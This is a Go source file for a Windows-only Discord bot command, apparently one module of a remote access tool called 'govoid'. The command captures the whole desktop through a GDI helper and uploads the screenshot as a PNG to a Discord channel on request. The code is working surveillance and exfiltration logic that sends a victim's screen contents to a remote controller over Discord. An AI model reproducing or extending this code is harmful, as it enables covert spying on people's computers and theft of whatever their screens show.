//go:build windows

package commands

import (
	"bytes"
	"fmt"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/win32"
)

// Screenshot captura el escritorio con GDI y lo sube como PNG.
func Screenshot(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	data, err := win32.CaptureScreen()
	if err != nil {
		Finish(s, i, "❌ "+err.Error())
		return
	}

	content := fmt.Sprintf("📸 Screenshot — %s", time.Now().Format("2006-01-02 15:04:05"))
	file := &discordgo.File{
		Name:        fmt.Sprintf("screenshot_%d.png", time.Now().Unix()),
		ContentType: "image/png",
		Reader:      bytes.NewReader(data),
	}

	if _, err := s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
		Content: &content,
		Files:   []*discordgo.File{file},
	}); err != nil {
		Finish(s, i, "❌ No se pudo subir el screenshot: "+err.Error())
	}
}
